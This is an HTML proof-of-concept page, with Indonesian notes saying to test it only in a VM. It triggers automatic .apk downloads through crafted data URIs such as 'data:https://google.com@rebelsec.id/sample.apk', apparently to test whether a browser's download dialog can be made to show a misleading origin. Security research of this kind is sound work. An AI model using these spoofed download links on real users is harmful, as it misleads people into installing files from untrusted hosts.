<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>PoC - data variations (4 buttons)</title>
  <style>
    body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:18px;max-width:900px}
    h2{margin-top:0}
    button{margin:6px 6px 6px 0;padding:8px 12px}
    pre{background:#f6f6f6;padding:8px;border-radius:6px}
    label{font-weight:600}
  </style>
</head>
<body>
  <h2>PoC — 4 Variasi (klik lalu lihat dialog download)</h2>
  <p>Uji ini hanya di lingkungan test/VM. Catat teks yang muncul di dialog download.</p>

  <div>
    <button onclick="btn1()">Tombol 1 — data + space</button>
    <button onclick="btn2()">Tombol 2 — data (encoded 'https://google.com')</button>
    <button onclick="btn3()">Tombol 3 — data:https://google.com@rebelsec.id/...</button>
    <button onclick="btn4()">Tombol 4 — rebelsec.id/sample.apk (no scheme)</button>
  </div>

  <h3>Log</h3>
  <pre id="log">Ready. Klik tombol untuk memicu download.</pre>

<script>
/* Puf: create anchor, set download & href, click, remove */
function Puf(uri, name) {
  const a = document.createElement('a');
  a.download = name || '';
  a.href = uri;
  document.body.appendChild(a);
  // optional: open in same tab for some weird cases: a.target = '_blank';
  a.click();
  setTimeout(()=>{ a.remove(); }, 50);
  log('Triggered Puf() with:\\n  href: ' + uri + '\\n  download: ' + name);
}
function log(s){ document.getElementById('log').textContent = s; }

/* Tombol 1: data + single space */
function btn1(){
  // exactly "data: " (data colon + single space)
  const href = 'data: ';
  const name = 't1-data-space.apk';
  Puf(href, name);
}

/* Tombol 2: data containing percent-encoded https://google.com
   We'll put "source: https://google.com" percent-encoded inside data.
*/
function btn2(){
  const inner = 'source: https://google.com';
  const encoded = encodeURIComponent(inner); // percent-encoded
  const href = 'data:text/plain,' + encoded;
  const name = 't2-data-encoded.apk';
  Puf(href, name);
}

/* Tombol 3: exact literal as requested */
function btn3(){
  const href = 'data:https://google.com@rebelsec.id/sample.apk';
  const name = 'o12lksasdo.coasdm.apk';
  Puf(href, name);
}

/* Tombol 4: relative / no scheme (will be resolved relative to current page) */
function btn4(){
  const href = 'rebelsec.id/sample.apk';
  const name = 'o12lksasdo.coasdm.apk';
  Puf(href, name);
}
</script>
</body>
</html>
